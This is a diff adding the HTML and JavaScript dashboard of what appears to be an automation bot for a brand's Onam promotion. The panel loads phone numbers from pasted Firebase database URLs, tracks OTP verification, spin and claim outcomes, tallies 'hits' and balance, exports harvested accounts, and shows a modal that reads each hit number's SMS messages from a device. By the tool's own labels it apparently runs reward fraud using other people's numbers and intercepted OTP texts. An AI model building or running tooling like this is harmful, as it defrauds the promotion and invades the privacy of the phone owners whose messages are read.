@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ujala Happiest Onam - Web Panel</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e1a;
+            color: #e0e0e0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            display: flex;
+            height: 100vh;
+            gap: 10px;
+            padding: 10px;
+        }
+        .sidebar {
+            width: 300px;
+            background: #141b2d;
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            overflow-y: auto;
+        }
+        .main { flex: 1; display: flex; flex-direction: column; gap: 10px; min-width: 0; }
+        .top-row { display: flex; gap: 10px; height: 50%; }
+        .bottom-row { display: flex; gap: 10px; height: 50%; }
+        .panel {
+            background: #141b2d;
+            border-radius: 12px;
+            padding: 15px;
+            overflow-y: auto;
+            flex: 1;
+        }
+        .panel-title {
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #6b7a9f;
+            margin-bottom: 10px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .stat-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .stat-card {
+            background: #1a2338;
+            border-radius: 8px;
+            padding: 12px;
+            text-align: center;
+        }
+        .stat-value { font-size: 24px; font-weight: bold; color: #fff; }
+        .stat-label { font-size: 11px; color: #6b7a9f; margin-top: 4px; }
+        .stat-value.success { color: #4ade80; }
+        .stat-value.failed { color: #f87171; }
+        .stat-value.hit { color: #fbbf24; }
+        .stat-value.info { color: #60a5fa; }
+        
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 13px;
+        }
+        .btn:hover { opacity: 0.8; transform: scale(0.98); }
+        .btn-start { background: #22c55e; color: #fff; }
+        .btn-stop { background: #ef4444; color: #fff; }
+        .btn-primary { background: #3b82f6; color: #fff; }
+        .btn-success { background: #22c55e; color: #fff; }
+        .btn-danger { background: #ef4444; color: #fff; }
+        .btn-warning { background: #f59e0b; color: #fff; }
+        .btn-secondary { background: #4b5563; color: #fff; }
+        .btn-sm { padding: 4px 10px; font-size: 11px; }
+        
+        .logs-container {
+            height: 100%;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            background: #0a0e1a;
+            border-radius: 8px;
+            padding: 8px;
+        }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        .log-entry .time { color: #6b7a9f; margin-right: 8px; }
+        .log-entry .msg { color: #c8d0e0; }
+        .log-entry .msg.success { color: #4ade80; }
+        .log-entry .msg.error { color: #f87171; }
+        .log-entry .msg.warning { color: #fbbf24; }
+        .log-entry .msg.hit { color: #fbbf24; font-weight: bold; background: rgba(251, 191, 36, 0.1); padding: 2px 6px; border-radius: 4px; display: inline-block; }
+        .log-entry .msg.info { color: #60a5fa; }
+        
+        .number-list { display: flex; flex-wrap: wrap; gap: 4px; }
+        .number-chip {
+            background: #1a2338;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-family: monospace;
+        }
+        .number-chip.success { background: rgba(74, 222, 128, 0.2); color: #4ade80; }
+        .number-chip.failed { background: rgba(248, 113, 113, 0.2); color: #f87171; }
+        .number-chip.hit { background: rgba(251, 191, 36, 0.2); color: #fbbf24; }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        .status-indicator.running { background: #4ade80; animation: pulse 1s infinite; }
+        .status-indicator.stopped { background: #6b7a9f; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        
+        .controls { display: flex; gap: 8px; flex-wrap: wrap; }
+        
+        .flex { display: flex; }
+        .flex-col { flex-direction: column; }
+        .gap-2 { gap: 8px; }
+        .gap-4 { gap: 16px; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .mt-2 { margin-top: 8px; }
+        .mb-2 { margin-bottom: 8px; }
+        .w-full { width: 100%; }
+        .text-center { text-align: center; }
+        
+        .scrollbar::-webkit-scrollbar { width: 4px; }
+        .scrollbar::-webkit-scrollbar-track { background: #0a0e1a; }
+        .scrollbar::-webkit-scrollbar-thumb { background: #1a2338; border-radius: 2px; }
+        
+        textarea {
+            width: 100%;
+            padding: 8px;
+            border-radius: 4px;
+            border: 1px solid #1a2338;
+            background: #0a0e1a;
+            color: #e0e0e0;
+            font-size: 11px;
+            font-family: monospace;
+            resize: vertical;
+            min-height: 60px;
+        }
+        textarea:focus { outline: none; border-color: #3b82f6; }
+        
+        .recent-list { font-size: 12px; }
+        .recent-item { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; }
+        .recent-item .phone { font-family: monospace; }
+        .recent-item .reward { font-weight: bold; }
+        .recent-item .reward.hit { color: #fbbf24; }
+        
+        .panel-list { font-size: 12px; font-family: monospace; max-height: 120px; overflow-y: auto; }
+        .panel-item {
+            padding: 4px 8px;
+            margin: 2px 0;
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0a0e1a;
+        }
+        .panel-item.active { background: rgba(59, 130, 246, 0.2); border-left: 3px solid #3b82f6; }
+        .panel-url { font-size: 10px; color: #6b7a9f; word-break: break-all; flex: 1; margin-right: 8px; }
+        
+        @media (max-width: 768px) {
+            .container { flex-direction: column; }
+            .sidebar { width: 100%; height: 40vh; }
+            .top-row, .bottom-row { flex-direction: column; height: auto; }
+            .top-row .panel, .bottom-row .panel { height: 300px; }
+            .stat-grid { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Sidebar -->
+        <div class="sidebar scrollbar">
+            <div>
+                <h2 style="color: #fbbf24; font-size: 20px;">🎡 Ujala Onam</h2>
+                <div style="font-size: 12px; color: #6b7a9f;">Web Automation</div>
+            </div>
+            
+            <div class="controls">
+                <button class="btn btn-start" id="btnStart">▶ Start</button>
+                <button class="btn btn-stop" id="btnStop" disabled>⏹ Stop</button>
+            </div>
+            
+            <div class="stat-grid">
+                <div class="stat-card"><div class="stat-value info" id="statProcessed">0</div><div class="stat-label">Processed</div></div>
+                <div class="stat-card"><div class="stat-value success" id="statSuccess">0</div><div class="stat-label">Successful</div></div>
+                <div class="stat-card"><div class="stat-value failed" id="statFailed">0</div><div class="stat-label">Failed</div></div>
+                <div class="stat-card"><div class="stat-value hit" id="statHits">0</div><div class="stat-label">⭐ HITS</div></div>
+            </div>
+            
+            <div style="font-size: 13px;">
+                <div class="flex justify-between"><span>💰 Total Balance</span><span id="statBalance">0</span></div>
+                <div class="flex justify-between"><span>📡 Status</span><span><span class="status-indicator stopped" id="statusIndicator"></span><span id="statusText">Stopped</span></span></div>
+                <div class="flex justify-between"><span>🔧 Workers</span><span id="statWorkers">0</span></div>
+                <div class="flex justify-between"><span>📡 Panel</span><span id="currentPanel">None</span></div>
+            </div>
+            
+            <div>
+                <div class="panel-title">📡 Databases (<span id="panelCount">0</span>)</div>
+                <div class="panel-list" id="panelList"><div style="color:#6b7a9f; font-size:12px;">No panels added</div></div>
+                <div style="margin-top: 8px;">
+                    <textarea id="panelInput" placeholder="Add Firebase URLs, one per line"></textarea>
+                    <div style="display:flex; gap:4px; margin-top:4px; flex-wrap:wrap;">
+                        <button class="btn btn-primary btn-sm" id="btnAddPanels">➕ Add All</button>
+                        <button class="btn btn-secondary btn-sm" id="btnNextPanel">⏭️ Next</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div>
+                <div class="panel-title">📋 Recent Numbers</div>
+                <div class="number-list" id="numberList"><span style="color:#6b7a9f; font-size:12px;">No numbers yet</span></div>
+            </div>
+        </div>
+        
+        <!-- Main -->
+        <div class="main">
+            <div class="top-row">
+                <div class="panel">
+                    <div class="flex justify-between items-center">
+                        <div class="panel-title">📊 Live Logs</div>
+                        <button class="btn btn-sm btn-danger" id="btnClearLogs">Clear</button>
+                    </div>
+                    <div class="logs-container scrollbar" id="logsContainer"><div style="color:#6b7a9f; text-align:center; padding:20px;">Waiting for activity...</div></div>
+                </div>
+                <div class="panel" style="max-width:300px;">
+                    <div class="panel-title">⭐ Recent Hits</div>
+                    <div class="recent-list" id="recentHits"><div style="color:#6b7a9f; font-size:12px;">No hits yet</div></div>
+                </div>
+            </div>
+            <div class="bottom-row">
+                <div class="panel">
+                    <div class="panel-title">📱 Recent Accounts</div>
+                    <div class="recent-list" id="recentAccounts"><div style="color:#6b7a9f; font-size:12px;">No accounts yet</div></div>
+                </div>
+                <div class="panel" style="max-width:300px;">
+                    <div class="panel-title">📊 Statistics</div>
+                    <div style="font-size:12px; line-height:2;">
+                        <div class="flex justify-between"><span>OTP Timeout:</span><span id="statOtpTimeout">0</span></div>
+                        <div class="flex justify-between"><span>Verification Failed:</span><span id="statVerifFailed">0</span></div>
+                        <div class="flex justify-between"><span>Spin Failed:</span><span id="statSpinFailed">0</span></div>
+                        <div class="flex justify-between"><span>Claim Failed:</span><span id="statClaimFailed">0</span></div>
+                        <hr style="border-color:#1a2338; margin:4px 0;">
+                        <div class="flex justify-between"><span>📈 Success Rate:</span><span id="statRate">0%</span></div>
+                    </div>
+                    <div style="margin-top:8px; display:flex; gap:4px; flex-wrap:wrap;">
+                        <button class="btn btn-sm btn-primary" id="btnExportAccounts">📤 Accounts</button>
+                        <button class="btn btn-sm btn-warning" id="btnExportHits">⭐ Hits</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== NEW: HIT MESSAGES MODAL ==================== -->
+    <div id="hitMessagesModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
+        <div style="background:#141b2d; border-radius:12px; padding:20px; width:90%; max-width:600px; max-height:80vh; display:flex; flex-direction:column;">
+            <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
+                <h3 style="color:#fbbf24; margin:0;">📨 Messages for <span id="msgPhone" style="color:#fff;">-</span></h3>
+                <div>
+                    <button class="btn btn-sm btn-warning" id="refreshMsgBtn" onclick="refreshHitMessages()">🔄 Refresh</button>
+                    <button class="btn btn-sm btn-danger" onclick="closeHitModal()">✕ Close</button>
+                </div>
+            </div>
+            <div id="msgList" style="overflow-y:auto; flex:1; font-family:monospace; font-size:12px; color:#c8d0e0; background:#0a0e1a; padding:10px; border-radius:8px;">
+                Loading messages...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let socket = null;
+        
+        function connectSocket() {
+            socket = io();
+            socket.on('connect', function() { console.log('WebSocket connected'); });
+            socket.on('status_update', function(data) { updateUI(data); });
+            socket.on('new_log', function(log) { addLog(log); });
+            socket.on('disconnect', function() { setTimeout(connectSocket, 2000); });
+        }
+        
+        function updateUI(data) {
+            document.getElementById('statProcessed').textContent = data.total_processed || 0;
+            document.getElementById('statSuccess').textContent = data.successful || 0;
+            document.getElementById('statFailed').textContent = data.failed || 0;
+            document.getElementById('statHits').textContent = data.hits || 0;
+            document.getElementById('statBalance').textContent = data.total_balance || 0;
+            document.getElementById('statWorkers').textContent = data.active_workers || 0;
+            document.getElementById('currentPanel').textContent = data.current_panel || 'None';
+            
+            const indicator = document.getElementById('statusIndicator');
+            const statusText = document.getElementById('statusText');
+            if (data.running) {
+                indicator.className = 'status-indicator running';
+                statusText.textContent = 'Running';
+                document.getElementById('btnStart').disabled = true;
+                document.getElementById('btnStop').disabled = false;
+            } else {
+                indicator.className = 'status-indicator stopped';
+                statusText.textContent = 'Stopped';
+                document.getElementById('btnStart').disabled = false;
+                document.getElementById('btnStop').disabled = true;
+            }
+            
+            const numberList = document.getElementById('numberList');
+            if (data.numbers_found && data.numbers_found.length > 0) {
+                numberList.innerHTML = data.numbers_found.slice(0, 20).map(n => 
+                    `<span class="number-chip">${n}</span>`
+                ).join('');
+                if (data.numbers_found.length > 20) {
+                    numberList.innerHTML += `<span class="number-chip">+${data.numbers_found.length - 20} more</span>`;
+                }
+            }
+            
+            const recentAccounts = document.getElementById('recentAccounts');
+            if (data.recent_accounts && data.recent_accounts.length > 0) {
+                recentAccounts.innerHTML = data.recent_accounts.slice(-20).reverse().map(a => `
+                    <div class="recent-item">
+                        <span class="phone">${a.is_hit ? '⭐' : '📱'} ${a.phone}</span>
+                        <span class="reward ${a.is_hit ? 'hit' : ''}">${a.reward}</span>
+                        <span style="color:#6b7a9f;font-size:10px;">${a.time}</span>
+                    </div>
+                `).join('');
+            }
+            
+            // ==================== UPDATED: RECENT HITS WITH "Msgs" BUTTON ====================
+            const recentHits = document.getElementById('recentHits');
+            if (data.recent_hits && data.recent_hits.length > 0) {
+                recentHits.innerHTML = data.recent_hits.slice(-20).reverse().map((h, idx) => `
+                    <div class="recent-item">
+                        <div style="display:flex; flex-direction:column; gap:2px; flex:1;">
+                            <span><span class="phone">⭐ ${h.phone}</span> <span class="reward hit">${h.reward}</span></span>
+                            <div style="display:flex; gap:4px; margin-top:2px;">
+                                <button class="btn btn-sm btn-primary" onclick="viewHitMessages(${h.hit_index})" style="padding:1px 6px; font-size:10px;">📨 Msgs</button>
+                            </div>
+                        </div>
+                        <span style="color:#6b7a9f;font-size:10px;">${h.time}</span>
+                    </div>
+                `).join('');
+            } else {
+                recentHits.innerHTML = '<div style="color:#6b7a9f; font-size:12px;">No hits yet</div>';
+            }
+            
+            // Stats
+            if (data.stats) {
+                document.getElementById('statOtpTimeout').textContent = data.stats.otp_timeout || 0;
+                document.getElementById('statVerifFailed').textContent = data.stats.verification_failed || 0;
+                document.getElementById('statSpinFailed').textContent = data.stats.spin_failed || 0;
+                document.getElementById('statClaimFailed').textContent = data.stats.claim_failed || 0;
+                const rate = data.total_processed > 0 ? ((data.successful / data.total_processed) * 100).toFixed(1) : 0;
+                document.getElementById('statRate').textContent = rate + '%';
+            }
+        }
+        
+        function addLog(log) {
+            const container = document.getElementById('logsContainer');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            const time = log.timestamp || new Date().toLocaleTimeString();
+            const typeClass = log.type || 'info';
+            entry.innerHTML = `<span class="time">${time}</span><span class="msg ${typeClass}">${log.message}</span>`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
+            while (container.children.length > 500) { container.removeChild(container.firstChild); }
+        }
+        
+        // Load panels
+        async function loadPanels() {
+            try {
+                const resp = await fetch('/api/panels');
+                const data = await resp.json();
+                const list = document.getElementById('panelList');
+                document.getElementById('panelCount').textContent = data.panels.length;
+                
+                if (data.panels.length === 0) {
+                    list.innerHTML = '<div style="color:#6b7a9f;font-size:12px;">No panels added</div>';
+                    return;
+                }
+                list.innerHTML = data.panels.map((url, i) => `
+                    <div class="panel-item ${i === data.current_index ? 'active' : ''}">
+                        <span class="panel-url">${i+1}. ${url.substring(0,50)}${url.length > 50 ? '...' : ''}</span>
+                        <div>
+                            ${i !== data.current_index ? `<button class="btn btn-sm btn-primary" onclick="selectPanel(${i})">Select</button>` : ''}
+                            <button class="btn btn-sm btn-danger" onclick="deletePanel(${i})">✕</button>
+                        </div>
+                    </div>
+                `).join('');
+            } catch(e) { console.error(e); }
+        }
+        
+        async function selectPanel(index) {
+            await fetch('/api/panels/select', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({index}) });
+            loadPanels();
+        }
+        
+        async function deletePanel(index) {
+            if (!confirm('Delete this panel?')) return;
+            await fetch('/api/panels/delete', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({index}) });
+            loadPanels();
+        }
+
+        // ==================== NEW: HIT MESSAGES FUNCTIONS ====================
+        let currentHitIndex = null;
+
+        async function viewHitMessages(index) {
+            currentHitIndex = index;
+            document.getElementById('hitMessagesModal').style.display = 'flex';
+            document.getElementById('msgList').innerHTML = 'Loading messages...';
+            document.getElementById('msgPhone').textContent = 'Hit #' + index;
+            try {
+                const resp = await fetch(`/api/hits/${index}/messages`);
+                const messages = await resp.json();
+                renderMessages(messages);
+            } catch(e) {
+                document.getElementById('msgList').innerHTML = `<span style="color:#f87171;">Error loading messages</span>`;
+            }
+        }
+
+        async function refreshHitMessages() {
+            if(currentHitIndex === null) return;
+            document.getElementById('refreshMsgBtn').disabled = true;
+            document.getElementById('refreshMsgBtn').textContent = 'Refreshing...';
+            try {
+                const resp = await fetch(`/api/hits/${currentHitIndex}/messages/refresh`, { method: 'POST' });
+                const messages = await resp.json();
+                renderMessages(messages);
+            } catch(e) {
+                alert('Failed to refresh messages');
+            }
+            document.getElementById('refreshMsgBtn').disabled = false;
+            document.getElementById('refreshMsgBtn').textContent = '🔄 Refresh';
+        }
+
+        function renderMessages(messages) {
+            const container = document.getElementById('msgList');
+            if(!messages || messages.length === 0) {
+                container.innerHTML = '<span style="color:#6b7a9f;">No messages found for this device.</span>';
+                return;
+            }
+            container.innerHTML = messages.map(msg => `
+                <div style="border-bottom:1px solid #1a2338; padding:6px 0;">
+                    <div style="color:#6b7a9f; font-size:10px;">From: ${msg.sender || 'Unknown'} (${msg.timestamp || 'N/A'})</div>
+                    <div style="color:#e0e0e0;">${msg.text || ''}</div>
+                </div>
+            `).join('');
+        }
+
+        function closeHitModal() {
+            document.getElementById('hitMessagesModal').style.display = 'none';
+            currentHitIndex = null;
+        }
+        
+        // Event listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            connectSocket();
+            loadPanels();
+            
+            document.getElementById('btnStart').addEventListener('click', async function() {
+                const imagePath = prompt('Enter image path (default: pack.jpg):', 'pack.jpg');
+                const code = prompt('Enter product code (default: 8902102126232):', '8902102126232');
+                const resp = await fetch('/api/start', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({image_path: imagePath || 'pack.jpg', code: code || '8902102126232'})
+                });
+                const data = await resp.json();
+                if (!data.success) alert(data.error || 'Failed to start');
+            });
+            
+            document.getElementById('btnStop').addEventListener('click', async function() {
+                await fetch('/api/stop', {method:'POST'});
+            });
+            
+            document.getElementById('btnAddPanels').addEventListener('click', async function() {
+                const input = document.getElementById('panelInput');
+                const urls = input.value.split('\n').map(u => u.trim()).filter(u => u);
+                if (urls.length === 0) return alert('Enter at least one URL');
+                const resp = await fetch('/api/panels/add', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({urls})
+                });
+                const data = await resp.json();
+                if (data.added > 0) {
+                    input.value = '';
+                    loadPanels();
+                } else {
+                    alert('No panels added. Check URLs.');
+                }
+            });
+            
+            document.getElementById('btnNextPanel').addEventListener('click', async function() {
+                await fetch('/api/panels/next', {method:'POST'});
+                loadPanels();
+            });
+            
+            document.getElementById('btnExportAccounts').addEventListener('click', function() {
+                window.open('/api/export/accounts', '_blank');
+            });
+            document.getElementById('btnExportHits').addEventListener('click', function() {
+                window.open('/api/export/hits', '_blank');
+            });
+            document.getElementById('btnClearLogs').addEventListener('click', function() {
+                document.getElementById('logsContainer').innerHTML = '';
+            });
+        });
+    </script>
+</body>
+</html>
